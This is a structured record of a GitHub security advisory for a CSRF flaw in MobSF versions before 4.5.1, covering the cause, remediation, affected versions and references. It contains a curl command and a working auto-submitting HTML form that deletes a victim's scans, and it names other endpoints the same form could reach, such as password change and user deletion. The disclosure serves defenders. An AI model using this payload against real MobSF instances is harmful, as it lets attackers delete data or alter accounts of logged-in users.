@@ -1,0 +1,143 @@
+advisory_id: GHSA-3p54-567p-2wpr
+datasource_id: github_osv/GHSA-3p54-567p-2wpr
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-3p54-567p-2wpr/GHSA-3p54-567p-2wpr.json
+aliases:
+  - CVE-2026-68923
+summary: |
+  MobSF's CSRF checks not enforced after Django migration
+  ### Summary
+
+  Django's `CsrfViewMiddleware` exists only in the deprecated `MIDDLEWARE_CLASSES` (ignored since Django 2.0). The active `MIDDLEWARE` tuple does not include it. All authenticated web POST endpoints (delete scan, upload, download APK, change password, manage users) accept requests without CSRF tokens.
+
+  ### Verified Impact
+
+  This was verified by **actually deleting a real scan** from the running server using only a session cookie — no CSRF token was required:
+
+  ```
+  $ curl -s -b cookies.txt -X POST "http://127.0.0.1:8000/delete_scan/" \
+      -d "md5=68e76627798d62555d5287f4488a32c7&scan_type=apk"
+  {"deleted": "yes"}
+  ```
+
+  The scan was removed from the database. This attack works from any website via HTML form auto-submission because:
+  - **No CSRF token is validated** (middleware absent)
+  - **Cookie `SameSite=Lax`** allows form-based top-level navigation to send the session cookie
+
+  ### Affected Component
+
+  ```
+  File: mobsf/MobSF/settings.py (Lines 206-212)
+
+  MIDDLEWARE = (
+      'mobsf.MobSF.views.api.api_middleware.RestApiAuthMiddleware',
+      'django.contrib.sessions.middleware.SessionMiddleware',
+      'django.contrib.auth.middleware.AuthenticationMiddleware',
+      'django.contrib.messages.middleware.MessageMiddleware',
+      # MISSING: 'django.middleware.csrf.CsrfViewMiddleware'
+  )
+  ```
+
+  ### Steps to Reproduce
+
+  **1.** Start MobSF v4.4.6 and log in at `http://127.0.0.1:8000/login/` (creds: `mobsf/mobsf`).
+
+  **2.** Upload and scan any APK to create a scan entry. Note the MD5 hash from "Recent Scans".
+
+  **3.** Open the following HTML file in the **same browser** (simulates visiting attacker's page):
+
+  ```html
+  <!DOCTYPE html>
+  <html>
+  <head><title>Innocent Page</title></head>
+  <body>
+  <h1>Loading...</h1>
+  <form id="f" method="POST" action="http://127.0.0.1:8000/delete_scan/">
+    <input type="hidden" name="md5" value="PUT_REAL_MD5_HASH_HERE" />
+    <input type="hidden" name="scan_type" value="apk" />
+  </form>
+  <script>document.getElementById('f').submit();</script>
+  </body>
+  </html>
+  ```
+
+  **4.** The scan is deleted. Navigate back to MobSF "Recent Scans" to confirm it's gone.
+
+  ### Why This Is Not a Self-Bug
+
+  - The attack requires a **victim user** who is logged in to visit an attacker-controlled page
+  - The attacker crafts the form targeting the victim's MobSF instance
+  - All destructive POST endpoints are affected: `/delete_scan/`, `/upload/`, `/download_scan/`, `/change_password/`, `/create_user/`, `/delete_user/`
+  - This matches the pattern of previously accepted MobSF advisories (e.g., GHSA-5jc6-h9w7-jm3p, GHSA-8m9j-2f32-2vx4)
+
+  ### Remediation
+
+  Add `'django.middleware.csrf.CsrfViewMiddleware'` to the active `MIDDLEWARE` tuple.
+impacted_packages:
+  - purl: pkg:pypi/mobsf
+    affected_versions: vers:pypi/<4.5.1
+    fixed_versions: vers:pypi/4.5.1
+    affected_packages:
+      - pkg:pypi/mobsf@3.2.6
+      - pkg:pypi/mobsf@3.2.7
+      - pkg:pypi/mobsf@3.2.8
+      - pkg:pypi/mobsf@3.2.9
+      - pkg:pypi/mobsf@3.3.3
+      - pkg:pypi/mobsf@3.3.5
+      - pkg:pypi/mobsf@3.4.0
+      - pkg:pypi/mobsf@3.4.3
+      - pkg:pypi/mobsf@3.4.6
+      - pkg:pypi/mobsf@3.5.0
+      - pkg:pypi/mobsf@3.6.0
+      - pkg:pypi/mobsf@3.6.9
+      - pkg:pypi/mobsf@3.7.6
+      - pkg:pypi/mobsf@3.9.7
+      - pkg:pypi/mobsf@4.1.3
+      - pkg:pypi/mobsf@4.3.0
+      - pkg:pypi/mobsf@4.3.2
+      - pkg:pypi/mobsf@4.4.0
+      - pkg:pypi/mobsf@4.4.2
+      - pkg:pypi/mobsf@4.4.5
+    fixed_packages:
+      - pkg:pypi/mobsf@4.5.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/mobsf/mobile-security-framework-mobsf
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/mobsf/mobile-security-framework-mobsf
+        commit: 62563ca429a75b3e5d47a13b958e1d2e7d5e2bbf
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '6.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-3p54-567p-2wpr/GHSA-3p54-567p-2wpr.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-352
+references:
+  - url: https://github.com/MobSF/Mobile-Security-Framework-MobSF
+    reference_type:
+    reference_id:
+  - url: https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-3p54-567p-2wpr
+    reference_type:
+    reference_id:
+  - url: https://github.com/MobSF/Mobile-Security-Framework-MobSF/pull/2627
+    reference_type: other
+    reference_id: 2627
+  - url: https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/62563ca429a75b3e5d47a13b958e1d2e7d5e2bbf
+    reference_type: other
+    reference_id: 62563ca429a75b3e5d47a13b958e1d2e7d5e2bbf
+  - url: https://github.com/MobSF/Mobile-Security-Framework-MobSF/releases/tag/v4.5.1
+    reference_type: other
+    reference_id: v4.5.1
+exploits: []
